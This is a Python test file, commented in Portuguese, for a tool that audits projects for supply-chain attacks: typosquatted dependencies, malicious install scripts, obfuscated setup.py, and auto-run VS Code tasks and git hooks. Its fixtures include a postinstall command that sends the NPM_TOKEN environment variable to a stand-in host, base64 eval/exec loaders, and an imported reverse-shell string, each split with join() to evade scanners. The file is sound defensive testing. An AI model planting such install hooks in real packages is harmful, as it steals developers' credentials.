import json

import pytest

from guarnicao import dev

from .test_yara import REVERSE_SHELL

# Montadas com join() para este arquivo não ser detectado ao varrer o projeto.
ROUBA_TOKEN = "".join(["node -e \"require('https').get('https://coleta.exemplo/?t='+process.env.NPM_", "TOKEN)\""])
OFUSCADO = "".join(["eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base", "64').toString())"])
SETUP_MALICIOSO = "".join(["import base64\nexec(base", "64.b64decode('cHJpbnQoMSk='))\n"])

requer_yara = pytest.mark.skipif(not __import__("guarnicao.regras_yara").regras_yara.disponivel(),
                                 reason="yara-x não instalado")


def escrever_json(caminho, dados):
    caminho.parent.mkdir(parents=True, exist_ok=True)
    caminho.write_text(json.dumps(dados))


def por_categoria(achados, categoria):
    return [a for a in achados if a.categoria == categoria]


# --- typosquatting ----------------------------------------------------------

@pytest.mark.parametrize("nome, alvo", [
    ("reqeusts", "requests"),     # letras invertidas
    ("lodahs", "lodash"),
    ("expresss", "express"),      # letra a mais
    ("djangoo", "django"),
])
def test_parecido_detecta_imitacoes(nome, alvo):
    populares = dev._carregar_lista("populares_npm.txt", dev._normalizar_npm) | \
                dev._carregar_lista("populares_pypi.txt", dev._normalizar_pypi)
    assert dev.parecido(nome, populares) == alvo


@pytest.mark.parametrize("nome", ["preact", "requests", "chalk", "vue", "minha-lib-interna"])
def test_parecido_ignora_legitimos_e_curtos(nome):
    populares = dev._carregar_lista("populares_npm.txt", dev._normalizar_npm) | \
                dev._carregar_lista("populares_pypi.txt", dev._normalizar_pypi)
    assert dev.parecido(nome, populares) is None


def test_typosquatting_em_requirements_e_package_json(tmp_path):
    (tmp_path / "requirements.txt").write_text("reqeusts==2.0  # cuidado\nflask>=3\n-r outro.txt\n")
    escrever_json(tmp_path / "package.json", {"dependencies": {"lodahs": "^4", "react": "^19"}})
    achados = por_categoria(dev.auditar(tmp_path), "typosquatting")
    assert sorted(a.mensagem.split("'")[1] for a in achados) == ["lodahs", "reqeusts"]


def test_typosquatting_em_pyproject(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "x"\ndependencies = ["numpyy>=2", "rich"]\n')
    achados = por_categoria(dev.auditar(tmp_path), "typosquatting")
    assert len(achados) == 1 and "numpyy" in achados[0].mensagem


def test_distancia():
    assert dev.distancia("lodash", "lodahs") == 1     # inversão conta 1
    assert dev.distancia("abc", "abc") == 0
    assert dev.distancia("gato", "rato") == 1


# --- scripts de instalação --------------------------------------------------

@requer_yara
def test_postinstall_que_rouba_token_e_alto_risco(tmp_path):
    escrever_json(tmp_path / "node_modules" / "util-cores" / "package.json",
                  {"name": "util-cores", "scripts": {"postinstall": ROUBA_TOKEN}})
    altos = [a for a in dev.auditar(tmp_path) if a.gravidade == "alta"]
    assert any("credenciais" in a.mensagem for a in altos)


@requer_yara
def test_segue_arquivo_chamado_pelo_script(tmp_path):
    pacote = tmp_path / "node_modules" / "@escopo" / "pacote"
    escrever_json(pacote / "package.json", {"name": "@escopo/pacote", "scripts": {"preinstall": "node instalar.js"}})
    (pacote / "instalar.js").write_text(OFUSCADO)
    altos = [a for a in dev.auditar(tmp_path) if a.gravidade == "alta"]
    assert any(a.arquivo.name == "instalar.js" for a in altos)


@requer_yara
def test_shell_reverso_no_script_do_projeto(tmp_path):
    escrever_json(tmp_path / "package.json", {"scripts": {"prepare": REVERSE_SHELL}})
    assert any(a.gravidade == "alta" for a in dev.auditar(tmp_path))


@requer_yara
def test_instalador_estilo_esbuild_nao_e_ofuscacao(tmp_path):
    """Regressão: fromCharCode (ler um .tar) + child_process (rodar binário) é legítimo."""
    pacote = tmp_path / "node_modules" / "esbuild"
    escrever_json(pacote / "package.json", {"name": "esbuild", "scripts": {"postinstall": "node install.js"}})
    (pacote / "install.js").write_text(
        "const child_process = require('child_process');\n"
        "let str = (i, n) => String.fromCharCode(...buf.subarray(i, i + n));\n"
        "child_process.execFileSync(bin, ['--version']);\n")
    assert all(a.gravidade == "info" for a in dev.auditar(tmp_path))


def test_script_legitimo_de_dependencia_e_so_informativo(tmp_path):
    escrever_json(tmp_path / "node_modules" / "bcrypt" / "package.json",
                  {"name": "bcrypt", "scripts": {"install": "node-gyp rebuild"}})
    achados = dev.auditar(tmp_path)
    assert [a.gravidade for a in achados] == ["info"]


def test_ignora_package_json_internos_de_pacotes(tmp_path):
    escrever_json(tmp_path / "node_modules" / "lib" / "exemplos" / "demo" / "package.json",
                  {"scripts": {"postinstall": "node-gyp rebuild"}})
    assert dev.auditar(tmp_path) == []


# --- auto-execução e setup.py -----------------------------------------------

def test_tarefa_vscode_ao_abrir_pasta(tmp_path):
    (tmp_path / ".vscode").mkdir()
    (tmp_path / ".vscode" / "tasks.json").write_text(
        '{"version": "2.0.0", "tasks": [{"label": "x", "command": "npm start",'
        ' "runOptions": {"runOn": "folderOpen"}}]}')
    achados = por_categoria(dev.auditar(tmp_path), "auto-execução")
    assert achados and achados[0].gravidade == "media"


@requer_yara
def test_setup_py_ofuscado(tmp_path):
    (tmp_path / "setup.py").write_text(SETUP_MALICIOSO)
    achados = por_categoria(dev.auditar(tmp_path), "setup.py")
    assert any(a.gravidade == "alta" for a in achados)


def test_hook_git_ativo_e_informativo(tmp_path):
    hooks = tmp_path / ".git" / "hooks"
    hooks.mkdir(parents=True)
    (hooks / "pre-commit.sample").write_text("#!/bin/sh\n")
    hook = hooks / "pre-commit"
    hook.write_text("#!/bin/sh\nnpm test\n")
    hook.chmod(0o755)
    achados = dev.auditar(tmp_path)
    assert [(a.gravidade, a.arquivo.name) for a in achados] == [("info", "pre-commit")]


def test_projeto_limpo(tmp_path):
    escrever_json(tmp_path / "package.json", {"dependencies": {"react": "^19"}, "scripts": {"build": "vite build"}})
    (tmp_path / "requirements.txt").write_text("requests\nflask\n")
    assert dev.auditar(tmp_path) == []
